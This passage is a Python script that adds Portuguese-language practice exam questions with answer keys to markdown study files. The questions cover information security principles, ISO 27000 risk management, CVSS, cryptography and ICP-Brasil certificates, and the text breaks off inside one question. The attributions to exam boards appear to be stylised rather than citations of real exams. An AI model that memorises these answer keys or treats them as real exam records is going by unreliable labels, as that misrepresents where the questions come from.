# -*- coding: utf-8 -*-
"""
Script to enrich Module 10 (Seguranca da Informacao)
Files 01 to 05. Adds Questions 06 to 11 to each file (total 11 questions each).
Preserves existing questions 01-05 and all diagrams/formatting.
"""

import os
import re

BASE_DIR = "fontes_de_estudo/conhecimentos_especificos_b02_ti/10_seguranca_da_informacao"

def check_file(path):
    with open(path, "r", encoding="utf-8") as f:
        content = f.read()
    qs = re.findall(r"### Questão \d+", content)
    return len(qs), content

# ==============================================================================
# FILE 01: 01_principios_gestao_de_riscos_e_normas_iso_27000.md
# ==============================================================================
def enrich_file_01():
    path = os.path.join(BASE_DIR, "01_principios_gestao_de_riscos_e_normas_iso_27000.md")
    count, content = check_file(path)
    if count >= 10:
        print(f"File 01 already has {count} questions, skipping.")
        return

    q06 = """### Questão 06 (FGV - TRT / Analista Judiciário - TI - A Tríade CID e Atributos da Segurança)
A segurança da informação visa proteger os ativos organizacionais contra riscos cibernéticos, estruturando-se tradicionalmente em torno dos pilares da **Confidencialidade**, **Integridade** e **Disponibilidade** (Tríade CID).

Considere as seguintes situações ocorridas na infraestrutura de TI de um tribunal:

1. Um ataque de negação de serviço distribuído (DDoS) satura a largura de banda do datacenter, impedindo cidadãos e advogados de acessarem o portal do processo eletrônico durante todo o horário de expediente forense.  
2. Um atacante intercepta a transmissão de um despacho judicial e altera fraudulentamente o valor da condenação antes de retransmitir o pacote à parte credora.  
3. Um funcionário não autorizado obtém acesso a uma pasta compartilhada na rede interna e visualiza autos de processo que tramitavam em segredo de justiça estrito.  

As situações 1, 2 e 3 caracterizam, rigorosa e respectivamente, violações aos princípios de:

* **A)** Integridade, Confidencialidade e Disponibilidade.
* **B)** Disponibilidade, Integridade e Confidencialidade.
* **C)** Confidencialidade, Não Repúdio e Integridade.
* **D)** Disponibilidade, Autenticidade e Irretratabilidade.
* **E)** Integridade, Disponibilidade e Legalidade.

> **Comentário Detalhado:**
>
> - **Situação 1:** Trata-se de violação direta à **Disponibilidade**: a propriedade de que a informação e os sistemas estejam acessíveis e utilizáveis sob demanda por pessoas ou processos devidamente autorizados. O ataque DDoS torna o serviço inoperante.
> - **Situação 2:** Trata-se de violação direta à **Integridade**: a salvaguarda da exatidão, precisão e completude da informação e dos métodos de processamento, impedindo modificações, inserções ou exclusões não autorizadas ou acidentais.
> - **Situação 3:** Trata-se de violação direta à **Confidencialidade**: a garantia de que a informação não seja disponibilizada ou divulgada a indivíduos, entidades ou processos não autorizados.
> 
> **Gabarito: B**

---
"""

    q07 = """### Questão 07 (FCC - TRT / Analista Judiciário - TI - Classificação Corporativa de Informações)
No âmbito da governança de segurança da informação fundamentada nas normas ABNT NBR ISO/IEC 27001 e 27002, a classificação e a rotulagem de ativos informacionais são mandatórias para garantir que a informação receba um nível adequado de proteção de acordo com sua sensibilidade e criticidade.

Em uma estrutura corporativa padrão de 4 níveis, assinale a afirmativa que define corretamente a categoria **Confidencial**:

* **A)** Informação destinada à divulgação ampla para a sociedade civil, sem qualquer restrição de acesso ou direitos autorais.
* **B)** Informação de uso irrestrito por qualquer colaborador da organização, cuja divulgação não causa nenhum impacto negativo à instituição.
* **C)** Informação de elevado valor estratégico ou sensibilidade jurídica, cujo acesso é restrito estritamente a indivíduos com necessidade funcional indispensável de conhecê-la (*Need-to-Know*), e cujo vazamento ou divulgação não autorizada provocaria prejuízos financeiros, regulatórios, institucionais ou operacionais graves à organização.
* **D)** Informação que não precisa de senhas ou criptografia e pode ser postada livremente nas redes sociais corporativas.
* **E)** Documentos exclusivamente históricos produzidos há mais de 100 anos desprovidos de validade jurídica.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. Descreve a categoria **Pública**.
> - **B)** Incorreta. Descreve a categoria **Uso Interno** (ou Corporativo Geral).
> - **C)** **CORRETA.** Na taxonomia corporativa de segurança da informação (ISO/IEC 27002, controle 5.12):
>   - **Pública:** Divulgação irrestrita.
>   - **Interna:** Acessível por funcionários para atividades rotineiras.
>   - **Restrita:** Acessível por áreas ou grupos funcionais específicos.
>   - **Confidencial (ou Estritamente Confidencial):** Mais alto grau de proteção na taxonomia corporativa privada/geral. Exige segregação severa de privilégios baseada na "necessidade de conhecer" (*Need-to-Know*), criptografia em repouso e em trânsito, auditoria minuciosa de acessos e termo de confidencialidade formal, visto que seu comprometimento acarreta danos severos à instituição.
> - **D)** Incorreta. É a antítese de informação confidencial.
> - **E)** Incorreta. O critério de confidencialidade é a sensibilidade do dano em caso de vazamento, e não a antiguidade física do papel.
> 
> **Gabarito: C**

---
"""

    q08 = """### Questão 08 (FGV - TRT / Analista Judiciário - TI - Gestão de Riscos: Ativo, Ameaça e Vulnerabilidade)
Segundo as diretrizes para gestão de riscos de segurança da informação da ABNT NBR ISO/IEC 27005, o risco é formalmente concebido como a combinação da probabilidade de ocorrência de um evento com suas consequências/impactos sobre os ativos organizacionais.

A respeito das definições normativas dos componentes do risco, assinale a afirmativa correta:

* **A)** Uma ameaça é uma fraqueza ou falha intrínseca de um ativo ou controle que pode ser explorada por agentes externos.
* **B)** Uma vulnerabilidade é uma causa potencial de um incidente indesejado, que pode resultar em dano a um sistema ou organização.
* **C)** O risco manifesta-se quando uma **Ameaça** (agente com potencial de causar dano) explora com sucesso uma **Vulnerabilidade** (fraqueza ou brecha em hardware, software, processos ou pessoas), provocando um impacto adverso sobre um **Ativo** de informação valioso.
* **D)** Se uma organização possui uma vulnerabilidade grave em um sistema isolado que não possui nenhuma ameaça correspondente nem é exposto a rede, o risco é matematicamente infinito.
* **E)** Ativo de informação é exclusivamente o gabinete metálico da CPU do computador.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. Inverteu o conceito: fraqueza ou brecha intrínseca é uma **Vulnerabilidade**.
> - **B)** Incorreta. Inverteu o conceito: causa potencial de incidente indesejado é uma **Ameaça**.
> - **C)** **CORRETA.** Relação ontológica canônica da **ISO/IEC 27005**:
>   - **Ativo (Asset):** Qualquer coisa que tenha valor para a organização (dados, software, reputação, infraestrutura).
>   - **Ameaça (Threat):** Evento, ator ou fenômeno com potencial de provocar danos (hackers, malwares, desastres naturais, erros humanos).
>   - **Vulnerabilidade (Vulnerability):** Fragilidade ou ponto fraco em um ativo ou salvaguarda que pode ser explorado por uma ou mais ameaças.
>   - **Risco:** O potencial de uma ameaça explorar uma vulnerabilidade para causar impacto negativo nos objetivos de negócio. Sem vulnerabilidade ou sem ameaça, o risco é nulo.
> - **D)** Incorreta. Sem ameaça presente, a probabilidade de exploração é zero, logo o risco residual é nulo ou negligenciável ($Risco = Ameaça \\times Vulnerabilidade \\times Impacto$).
> - **E)** Incorreta. Ativo abrange informações digitais, impressas, conhecimento humano, softwares, bancos de dados e serviços.
> 
> **Gabarito: C**

---
"""

    q09 = """### Questão 09 (FCC - TRT / Analista Judiciário - TI - Estratégias de Tratamento de Riscos segundo a ISO/IEC 27005)
Após a conclusão das etapas de identificação e avaliação de riscos de segurança da informação, a organização deve selecionar a resposta apropriada para cada risco avaliado no processo de **Tratamento do Risco** (*Risk Treatment*).

A norma ABNT NBR ISO/IEC 27005 e o framework ISO 31000 prescrevem quatro opções clássicas de tratamento: **Modificação (Mitigação)**, **Retenção (Aceitação)**, **Evitação** e **Compartilhamento (Transferência)**.

Assinale a opção que ilustra corretamente uma estratégia de **Compartilhamento / Transferência do Risco**:

* **A)** A contratação de uma apólice de seguro contra incidentes cibernéticos (*Cyber Insurance*) ou a inclusão de cláusulas contratuais de indenização e responsabilidade financeira em contratos de serviços terceirizados de datacenter em nuvem.
* **B)** A decisão deliberada da alta administração em não adotar nenhuma salvaguarda e arcar com os prejuízos operacionais caso o incidente venha a ocorrer.
* **C)** A desativação definitiva de um serviço legado inseguro de FTP e cancelamento total da atividade de transferência externa de arquivos para eliminar a exposição ao perigo.
* **D)** A instalação de um sistema de firewall de última geração e criptografia de ponta a ponta para reduzir a probabilidade e o impacto de invasões.
* **E)** A execução de testes de penetração mensais sem qualquer correção de código.

> **Comentário Detalhado:**
>
> - **A)** **CORRETA.** Estratégias canônicas de tratamento do risco (ISO 27005 / ISO 31000):
>   1. **Compartilhar / Transferir (Risk Sharing/Transfer):** Envolve repassar parte do impacto financeiro ou operacional do risco a um terceiro, comumente via **seguros contra riscos cibernéticos** ou cláusulas contratuais com provedores terceirizados (SLA com multas). *A responsabilidade final pelo negócio continua com a organização, mas o encargo financeiro do risco é transferido.*
>   2. **Mitigar / Modificar (Risk Mitigation/Modification):** Aplicar controles de segurança (firewalls, criptografia, conscientização) para reduzir a probabilidade e/ou o impacto do risco. (Descrito em D).
>   3. **Evitar (Risk Avoidance):** Decidir não iniciar ou descontinuar a atividade ou processo que dá origem ao risco. (Descrito em C).
>   4. **Aceitar / Reter (Risk Retention/Acceptance):** Decisão fundamentada de manter o risco em seu nível atual sem controles adicionais, desde que esteja dentro do apetite a risco da alta gestão. (Descrito em B).
> - **B)** Incorreta. Exemplifica Aceitação / Retenção do Risco.
> - **C)** Incorreta. Exemplifica Evitação do Risco (*Avoidance*).
> - **D)** Incorreta. Exemplifica Modificação / Mitigação do Risco.
> - **E)** Incorreta. Fazer testes sem agir não constitui tratamento de risco eficaz.
> 
> **Gabarito: A**

---
"""

    q10 = """### Questão 10 (FGV - TRT / Analista Judiciário - TI - Métricas e Pontuação do CVSS v3.1)
O *Common Vulnerability Scoring System* (CVSS v3.1) é o padrão aberto internacional gerenciado pelo FIRST para pontuar e mensurar a severidade técnica de vulnerabilidades de segurança de software e hardware.

A respeito da estrutura das métricas e da escala de pontuação do CVSS v3.1, assinale a afirmativa correta:

* **A)** O CVSS gera uma pontuação contínua que varia de 0,0 a 10,0, onde vulnerabilidades com escore entre 9,0 e 10,0 são classificadas no nível de severidade **Crítico** (*Critical*).
* **B)** O grupo de Métricas Base (*Base Metrics Group*) mede as características que mudam com o passar do tempo e a disponibilidade de código de exploração (*exploit*) na internet.
* **C)** A métrica Vetor de Ataque (*Attack Vector - AV*) avalia apenas se o hacker possui nacionalidade brasileira.
* **D)** O escore de severidade do CVSS varia entre -100 e +100 pontos percentuais.
* **E)** Vulnerabilidades com escore Base igual a 0,0 são classificadas como emergência máxima de segurança nacional.

> **Comentário Detalhado:**
>
> - **A)** **CORRETA.** Estrutura formal do **CVSS v3.1**:
>   - **Escala de Severidade Qualitativa do FIRST:**
>     - **Nenhum (None):** $0,0$
>     - **Baixo (Low):** $0,1 - 3,9$
>     - **Médio (Medium):** $4,0 - 6,9$
>     - **Alto (High):** $7,0 - 8,9$
>     - **Crítico (Critical):** $9,0 - 10,0$
>   - **Três Grupos de Métricas:**
>     1. **Métricas Base (Base Metrics):** Qualidades intrínsecas constantes e imutáveis da falha (Explorabilidade: Vetor de Ataque, Complexidade, Privilégios Necessários, Interação do Usuário, Escopo; e Impacto: Confidencialidade, Integridade, Disponibilidade).
>     2. **Métricas Temporais (Temporal Metrics):** Fatores que variam ao longo do tempo (Maturidade do Código de Exploit, Nível de Remediação / Patches, Confiança no Relato).
>     3. **Métricas Ambientais (Environmental Metrics):** Características customizadas ao ambiente específico da organização.
> - **B)** Incorreta. Quem mede aspectos que mudam no tempo é o grupo de **Métricas Temporais**, não as Métricas Base.
> - **C)** Incorreta. O *Attack Vector (AV)* mede o contexto de rede necessário para explorar a falha: Rede (*Network - N*), Adjacente (*Adjacent - A*), Local (*Local - L*) ou Físico (*Physical - P*).
> - **D)** Incorreta. A escala é padronizada de $0,0$ a $10,0$.
> - **E)** Incorreta. Escore $0,0$ é *None* (ausência de severidade).
> 
> **Gabarito: A**

---
"""

    q11 = """### Questão 11 (FGV - TRT / Analista Judiciário - TI - A Nova ISO/IEC 27002:2022: Estrutura de Temas e Controles)
A norma ABNT NBR ISO/IEC 27002:2022 promoveu uma das mais profundas reestruturações na história do Sistema de Gestão da Segurança da Informação (SGSI), simplificando e modernizando o catálogo de controles de segurança.

A respeito da nova taxonomia e da quantidade de controles previstos na **ISO/IEC 27002:2022**, assinale a afirmativa correta:

* **A)** A edição de 2022 expandiu os controles para 250 itens divididos em 30 seções alfabéticas.
* **B)** A ISO/IEC 27002:2022 agrupou todos os seus **93 controles de segurança** em apenas **4 temas ou cláusulas principais**: Controles Organizacionais (Cláusula 5 - 37 controles), Controles de Pessoas (Cláusula 6 - 8 controles), Controles Físicos (Cláusula 7 - 14 controles) e Controles Tecnológicos (Cláusula 8 - 34 controles).
* **C)** A norma ISO/IEC 27002:2022 eliminou os controles tecnológicos para focar exclusivamente em barreiras físicas com cadeados.
* **D)** A Declaração de Aplicabilidade (SoA - *Statement of Applicability*) foi revogada pela ISO/IEC 27001 e deixou de ser exigida em auditorias de certificação.
* **E)** Todos os 93 controles da nova edição são de implementação obrigatória para qualquer empresa, sendo vedada a exclusão justificada de controles não aplicáveis.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. A versão anterior (2013) tinha 114 controles divididos em 14 seções; a nova edição de 2022 consolidou e reduziu o total para **93 controles**.
> - **B)** **CORRETA.** Estrutura canônica e moderna da **ISO/IEC 27002:2022**:
>   - Os 93 controles estão categorizados em **4 grandes temas**:
>     1. **Controles Organizacionais (Cláusula 5):** 37 controles (políticas, gestão de ativos, classificação, direitos de propriedade intelectual, etc.).
>     2. **Controles de Pessoas (Cláusula 6):** 8 controles (termos de contratação, conscientização, trabalho remoto).
>     3. **Controles Físicos (Cláusula 7):** 14 controles (perímetros de segurança, descarte de mídias, cabeamento seguro).
>     4. **Controles Tecnológicos (Cláusula 8):** 34 controles (autenticação, controle de acesso, criptografia, prevenção de vazamento de dados - DLP, monitoramento, mascaramento de dados).
>   - Além disso, introduziu o inovador conceito de **atributos de controles** (*Control Attributes* com 5 dimensões: Tipo de Controle, Propriedades da Informação, Conceitos de Cibersegurança, Capacidades Operacionais e Domínios de Segurança).
> - **C)** Incorreta. Os controles tecnológicos representam 34 controles vitais da norma.
> - **D)** Incorreta. A Declaração de Aplicabilidade (SoA, cláusula 6.1.3 da ISO/IEC 27001) permanece como documento central mandatório de auditoria de certificação.
> - **E)** Incorreta. A organização seleciona os controles aplicáveis por meio da análise de risco, documentando na SoA a justificativa de inclusão e as justificativas técnicas para exclusão de controles não pertinentes.
> 
> **Gabarito: B**

---
"""

    # Insert Q06 after 1.1 (before ### 1.2 Autenticidade, Não Repúdio e Atributos Complementares)
    p1 = "### 1.2 Autenticidade, Não Repúdio e Atributos Complementares"
    assert p1 in content
    content = content.replace(p1, q06 + "\n" + p1, 1)

    # Insert Q07 after 2.2 (before ## 3. Gestão e Análise de Riscos de Segurança da Informação)
    p2 = "## 3. Gestão e Análise de Riscos de Segurança da Informação"
    assert p2 in content
    content = content.replace(p2, q07 + "\n" + p2, 1)

    # Insert Q08 after 3.1 (before ### 3.2 Análise Qualitativa vs. Análise Quantitativa)
    p3 = "### 3.2 Análise Qualitativa vs. Análise Quantitativa (SLE, ARO e ALE)"
    assert p3 in content
    content = content.replace(p3, q08 + "\n" + p3, 1)

    # Insert Q09 after 3.3 (before ## 4. Gestão de Vulnerabilidades e Resposta a Incidentes)
    p4 = "## 4. Gestão de Vulnerabilidades e Resposta a Incidentes"
    assert p4 in content
    content = content.replace(p4, q09 + "\n" + p4, 1)

    # Insert Q10 after 4.1 (before ### 4.2 As Quatro Fases do Ciclo de Resposta a Incidentes)
    p5 = "### 4.2 As Quatro Fases do Ciclo de Resposta a Incidentes (NIST SP 800-61)"
    assert p5 in content
    content = content.replace(p5, q10 + "\n" + p5, 1)

    # Insert Q11 after 5.3 (before ## 🌐 Fontes Oficiais e Referências Bibliográficas)
    p6 = "## 🌐 Fontes Oficiais e Referências Bibliográficas"
    assert p6 in content
    content = content.replace(p6, q11 + "\n" + p6, 1)

    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    print("File 01 successfully enriched! Total questions:", len(re.findall(r"### Questão \d+", content)))

enrich_file_01()


# ==============================================================================
# FILE 02: 02_criptografia_icp_brasil_e_assinatura_digital.md
# ==============================================================================
def enrich_file_02():
    path = os.path.join(BASE_DIR, "02_criptografia_icp_brasil_e_assinatura_digital.md")
    count, content = check_file(path)
    if count >= 10:
        print(f"File 02 already has {count} questions, skipping.")
        return

    q06 = """### Questão 06 (FCC - TRT / Analista Judiciário - TI - Criptografia Simétrica e Gestão de Chaves)
A criptografia simétrica (ou de chave secreta) fundamenta-se no emprego de uma mesma chave compartilhada para as operações de cifragem e decifragem de mensagens.

A respeito das características operacionais e dos desafios arquiteturais da criptografia simétrica, assinale a afirmativa correta:

* **A)** A criptografia simétrica possui velocidade de processamento computacional extremamente lenta em comparação aos algoritmos assimétricos, sendo inviável para cifrar volumes massivos de dados em trânsito.
* **B)** Em uma rede corporativa composta por $N$ usuários que necessitam comunicar-se de modo estritamente privado em pares bidirecionais utilizando criptografia puramente simétrica, o número total de chaves secretas distintas que precisam ser geradas e gerenciadas com segurança é dado por:
$$\\frac{N(N - 1)}{2}$$
* **C)** A criptografia simétrica garante nativamente o princípio do Não Repúdio (irretratabilidade), visto que apenas o emissor detém a chave secreta.
* **D)** O algoritmo RSA é o padrão simétrico mais adotado pelo governo federal para proteção de discos rígidos em repouso.
* **E)** Chaves simétricas dispensam qualquer canal seguro prévio de compartilhamento, podendo ser transmitidas em texto claro e aberto pela internet sem riscos.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. A criptografia simétrica (como o AES) é ordens de grandeza **mais rápida** e eficiente em consumo de CPU do que a criptografia assimétrica, possuindo aceleração nativa por instruções de hardware nos processadores modernos (instruções Intel/AMD AES-NI).
> - **B)** **CORRETA.** O célebre problema da **distribuição e escalabilidade de chaves simétricas**:
>   - Se cada par de comunicantes precisa de uma chave exclusiva e sigilosa para que terceiros não possam decifrar o diálogo, o número de canais de comunicação é a combinação simples de $N$ tomados 2 a 2:
>     $$C_{N, 2} = \\frac{N!}{2!(N-2)!} = \\frac{N(N - 1)}{2}$$
>   - Para 1.000 usuários em uma organização, seriam necessárias $\\frac{1000 \\times 999}{2} = 499.500$ chaves secretas distribuídas previamente de modo seguro, tornando a gestão de chaves simétricas intransponível sem o auxílio de criptografia assimétrica.
> - **C)** Incorreta. Como a chave simétrica é **compartilhada** entre emissor e receptor, nenhum dos dois pode provar a um terceiro quem efetivamente cifrou o pacote (ausência de não repúdio).
> - **D)** Incorreta. O RSA é um algoritmo **assimétrico** (chaves pública e privada).
> - **E)** Incorreta. Se a chave simétrica for interceptada em trânsito, a confidencialidade de toda a comunicação é instantaneamente destruída.
> 
> **Gabarito: B**

---
"""

    q07 = """### Questão 07 (FCC - TRT-23 / Analista Judiciário - TI - Cifras de Bloco vs. Cifras de Fluxo: AES e ChaCha20)
O *Advanced Encryption Standard* (AES) é o padrão criptográfico simétrico mais adotado globalmente por governos e instituições financeiras para proteção de dados confidenciais.

A respeito da arquitetura interna do AES e da distinção entre cifras de bloco e cifras de fluxo, assinale a afirmativa correta:

* **A)** O AES é uma cifra de fluxo que processa dados bit a bit em tempo real sem qualquer buffer de entrada.
* **B)** O AES é uma cifra de bloco iterativa baseada em uma Rede de Substituição-Permutação (SPN), que opera sobre blocos de tamanho fixo de **128 bits**, suportando chaves criptográficas com três comprimentos normalizados: **128, 192 e 256 bits**, executando respectivamente 10, 12 e 14 rodadas (*rounds*) de transformação matemática.
* **C)** O AES opera exclusivamente com blocos de dados de 512 bits e foi decifrado por força bruta em 2010.
* **D)** Cifras de fluxo (como ChaCha20 e RC4) exigem compulsoriamente o preenchimento (*padding*) PKCS#7 para completar blocos múltiplos de 64 bits.
* **E)** O DES (Data Encryption Standard) possui chave efetiva de 256 bits e oferece maior segurança do que o AES-256.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. O AES é rigorosamente uma **cifra de bloco** (*block cipher*), operando sobre matrizes fixas de bytes.
> - **B)** **CORRETA.** Especificação técnica canônica do **AES (FIPS PUB 197)**:
>   - **Tamanho do Bloco:** Sempre e estritamente **128 bits** (16 bytes, dispostos em uma matriz $4 \\times 4$ de bytes denominada *State*).
>   - **Tamanhos de Chave e Número de Rodadas:**
>     1. Chave de 128 bits: 10 rodadas de processamento.
>     2. Chave de 192 bits: 12 rodadas de processamento.
>     3. Chave de 256 bits: 14 rodadas de processamento.
>   - **Transformações em cada Rodada:** `SubBytes` (substituição não linear via S-Box), `ShiftRows` (transposição por rotação cíclica), `MixColumns` (difusão linear em campo de Galois $GF(2^8)$) e `AddRoundKey` (combinação XOR com a chave da rodada).
> - **C)** Incorreta. O bloco do AES é invariavelmente de 128 bits; o AES permanece criptograficamente inquebrável contra ataques práticos.
> - **D)** Incorreta. Cifras de fluxo geram uma sequência pseudoaleatória contínua de bits (*keystream*) combinada via XOR com a mensagem, **dispensando qualquer padding**.
> - **E)** Incorreta. O DES clássico possui chave minúscula e insegura de apenas 56 bits efetivos, quebrado em minutos por ataques de força bruta.
> 
> **Gabarito: B**

---
"""

    q08 = """### Questão 08 (FGV - TRT-16 / Analista Judiciário - TI - Criptografia Assimétrica e Sistemas Híbridos)
Os sistemas de chave pública fundamentam-se em problemas matemáticos complexos de "funções alçapão de sentido único" (*one-way trapdoor functions*), viabilizando a comunicação sigilosa entre partes que nunca trocaram informações previamente.

A respeito dos algoritmos assimétricos e da mecânica dos sistemas de **Criptografia Híbrida** adotados na internet (como o protocolo TLS/HTTPS), assinale a afirmativa correta:

* **A)** Na criptografia híbrida, a mensagem integral (ex.: um arquivo de 10 Gigabytes) é inteiramente cifrada com a chave pública RSA do destinatário para garantir maior velocidade de transmissão.
* **B)** A Criptografia de Curva Elíptica (ECC) exige chaves muito maiores do que o RSA (ex.: chaves ECC de 4096 bits equivalem a chaves RSA de apenas 512 bits).
* **C)** Na criptografia híbrida, o remetente gera uma chave simétrica temporária e aleatória (chave de sessão, ex.: AES-256) para cifrar a mensagem com altíssima performance, e, em seguida, cifra apenas essa chave de sessão utilizando a chave pública assimétrica do destinatário, transmitindo ambos os elementos em conjunto.
* **D)** O algoritmo de troca de chaves Diffie-Hellman foi projetado exclusivamente para assinar e cifrar e-mails em formato PDF.
* **E)** Para que Bob decifre uma mensagem cifrada assimetricamente por Alice, ele deve obrigatoriamente utilizar a chave pública de Alice.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. Cifrar gigabytes com RSA puro seria proibitivamente lento e inviável em consumo de CPU.
> - **B)** Incorreta. O trunfo fundamental da **ECC (Elliptic Curve Cryptography)** é justamente o oposto: proporciona a mesma força de segurança teórica com **chaves substancialmente menores** (uma chave ECC de 256 bits equivale em segurança a uma chave RSA de 3072 bits), consumindo menos banda e bateria.
> - **C)** **CORRETA.** O modelo da **Criptografia Híbrida** combina as melhores propriedades dos dois mundos:
>   1. O emissor gera aleatoriamente uma chave simétrica efêmera (*Chave de Sessão*).
>   2. Cifra a massa volumosa de dados com algoritmo simétrico veloz (ex.: AES-256-GCM).
>   3. Cifra a chave de sessão com a chave pública assimétrica do receptor (ex.: RSA ou ECDH).
>   4. O destinatário recebe o pacote, decifra a chave de sessão utilizando sua própria chave privada assimétrica e, com ela, decifra a mensagem volumosa rapidamente. É a base do TLS/HTTPS, PGP/GPG e SSH.
> - **D)** Incorreta. O Diffie-Hellman é um protocolo matemático de **acordo/troca segura de chaves** sobre um canal inseguro, não servindo para cifragem direta de arquivos ou assinatura digital em sua forma pura.
> - **E)** Incorreta. Mensagens endereçadas a Bob são cifradas com a **chave pública de Bob** e só podem ser decifradas com a **chave privada de Bob**.
> 
> **Gabarito: C**

---
"""

    q09 = """### Questão 09 (FCC - TRT-6 / Analista Judiciário - TI - Funções de Resumo Criptográfico e Resistência a Colisões)
As funções de resumo criptográfico (*Cryptographic Hash Functions*) são primitivas matemáticas essenciais para verificação de integridade de dados e construção de assinaturas digitais.

A respeito das propriedades de segurança exigidas de uma função hash criptográfica moderna (como as famílias SHA-2 e SHA-3) e da obsolescência dos algoritmos MD5 e SHA-1, assinale a afirmativa correta:

* **A)** Uma função hash criptográfica segura deve ser facilmente reversível, permitindo reconstituir o texto original a partir do resumo hexadecimal gerado.
* **B)** A **Resistência à Colisão Forte** (*Collision Resistance*) é a propriedade que torna computacionalmente inviável encontrar quaisquer duas mensagens distintas $M_1$ e $M_2$ ($M_1 \\neq M_2$) tais que $Hash(M_1) = Hash(M_2)$; os algoritmos MD5 e SHA-1 são considerados criptograficamente vulneráveis e reprovados para novas aplicações governamentais justamente por terem sofrido ataques práticos comprovados de colisão.
* **C)** O algoritmo SHA-256 produz resumos de tamanho variável dependendo do número de linhas do texto de entrada.
* **D)** O Princípio da Casa dos Pombos garante matematicamente que é impossível haver colisões em funções hash de 128 bits.
* **E)** O MD5 permanece como o padrão oficial e exclusivo recomendado pelo ITI para certificação de documentos na ICP-Brasil.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. Funções hash criptográficas são de sentido único (*One-Way Functions*); é matematicamente mandatório que seja computacionalmente inviável recuperar $M$ a partir de $Hash(M)$ (**Resistência à Pré-Imagem**).
> - **B)** **CORRETA.** Propriedades formais mandatórias:
>   - **Resistência à Pré-Imagem (Sentido Único):** Dado $h$, inviável achar $M$ tal que $H(M) = h$.
>   - **Resistência à Segunda Pré-Imagem (Colisão Fraca):** Dado $M_1$, inviável achar $M_2 \\neq M_1$ tal que $H(M_1) = H(M_2)$.
>   - **Resistência à Colisão (Colisão Forte):** Inviável encontrar qualquer par arbitrário $(M_1, M_2)$ com o mesmo hash.
>   - **Obsolescência:** O MD5 (colisões geradas em segundos desde 2004) e o SHA-1 (colisão gerada pela Google no ataque SHAttered em 2017) foram banidos para fins de assinatura digital e integridade estrita pela ICP-Brasil e NIST, adotando-se o SHA-2 (SHA-256, SHA-512) e SHA-3.
> - **C)** Incorreta. O SHA-256 produz **sempre um resumo de comprimento fixo de 256 bits** (32 bytes / 64 caracteres hexadecimais), independentemente de a entrada ter 1 byte ou 10 Terabytes.
> - **D)** Incorreta. Pelo Princípio da Casa dos Pombos (*Pigeonhole Principle*), como o domínio de mensagens de entrada é infinito e a imagem do hash é finita ($2^{128}$), colisões existem compulsoriamente; o objetivo do algoritmo seguro é torná-las impossíveis de serem encontradas em tempo computável.
> - **E)** Incorreta. O MD5 é categoricamente proibido nas políticas de certificado da ICP-Brasil.
> 
> **Gabarito: B**

---
"""

    q10 = """### Questão 10 (FGV - TRT / Analista Judiciário - TI - Certificados ICP-Brasil: Padrão X.509 e Tipos A1 vs. A3)
A Infraestrutura de Chaves Públicas Brasileira (ICP-Brasil), regulamentada pela Medida Provisória nº 2.200-2/2001, emite certificados digitais no padrão internacional ITU-T X.509 v3.

A respeito das características dos certificados digitais de assinatura (Série A) nas modalidades **A1** e **A3**, assinale a afirmativa correta:

* **A)** O certificado A1 possui sua chave privada gerada e armazenada em hardware criptográfico inviolável (token USB ou smartcard), com prazo de validade de 5 anos.
* **B)** O certificado A3 armazena a chave privada diretamente no sistema operacional do computador do usuário em um arquivo com extensão `.pfx` ou `.p12`, permitindo cópia e instalação ilimitada em outros dispositivos.
* **C)** O certificado do tipo **A1** tem sua chave privada gerada e armazenada em software (no próprio computador ou servidor), com validade máxima de **1 ano**; ao passo que o certificado do tipo **A3** tem sua chave privada gerada e protegida exclusivamente no interior de um dispositivo de hardware criptográfico seguro (smartcard, token USB criptográfico ou Módulo de Segurança de Hardware - HSM com certificação FIPS 140-2 Nível 2 ou superior), com validade típica de até **3 a 5 anos**, sendo a chave privada intransferível e impossível de ser exportada.
* **D)** A ICP-Brasil não emite certificados do tipo A3 por considerá-los inseguros contra ameaças cibernéticas.
* **E)** Ambos os tipos utilizam certificados sem qualquer vínculo com a Autoridade Certificadora Raiz da ICP-Brasil (ITI).

> **Comentário Detalhado:**
>
> - **A)** Incorreta. Inverteu a modalidade: o armazenamento em hardware criptográfico é atributo do certificado **A3**, não do A1.
> - **B)** Incorreta. Quem é gerado em software e pode ser exportado em arquivo protegido por senha (`.pfx`) é o certificado **A1**.
> - **C)** **CORRETA.** Regulamentação oficial do Comitê Gestor da ICP-Brasil:
>   - **Certificado A1 (Assinatura em Software):** Chave privada gerada e armazenada em software/disco no computador ou repositório do navegador. Validade máxima estrita de **1 ano**. Permite backup e uso automatizado em servidores de aplicação.
>   - **Certificado A3 (Assinatura em Hardware Criptográfico):** Chave gerada no interior de um chip seguro (Cartão Inteligente, Token Criptográfico ou HSM). A chave privada nunca sai do chip (o cálculo criptográfico da assinatura ocorre dentro do próprio processador do token). Não admite exportação ou cópia. Validade de até **3 anos** (ou 5 anos em HSMs homologados).
> - **D)** Incorreta. O tipo A3 é o padrão amplamente exigido para membros da magistratura, membros do Ministério Público e auditores de controle externo.
> - **E)** Incorreta. Toda a hierarquia de confiança da ICP-Brasil deriva da Autoridade Certificadora Raiz mantida pelo Instituto Nacional de Tecnologia da Informação (ITI).
> 
> **Gabarito: C**

---
"""

    q11 = """### Questão 11 (FGV - TRT / Analista Judiciário - TI - Padrões de Assinatura Avançada e Carimbo do Tempo)
Em processos de fiscalização e auditoria eletrônica de longo prazo, documentos digitais assinados devem manter sua auditabilidade e validade probatória ao longo de décadas, superando a eventual expiração de certificados ou descontinuação de algoritmos criptográficos.

Para atender a esses requisitos de preservação de longo prazo no ecossistema da ICP-Brasil, a tecnologia que atesta a data e hora oficiais brasileiras fornecidas pelo Observatório Nacional e os formatos de assinatura avançada recomendados para preservação temporal são:

* **A)** O protocolo Telnet em conjunto com o formato TXT simples sem chaves.
* **B)** A Autoridade de Carimbo do Tempo (ACT), que emite carimbos do tempo criptográficos atestando tempestividade de forma juridicamente válida; e os perfis de assinatura digital avançada de longo prazo **CAdES**, **XAdES** e **PAdES** (com extensões para preservação histórica, como CAdES-A e PAdES-LTV).
* **C)** A gravação do relógio local do sistema operacional do computador do auditor no rodapé do documento em fonte Arial.
* **D)** O formato DOC sem criptografia assinado via botão de macro do Microsoft Word 97.
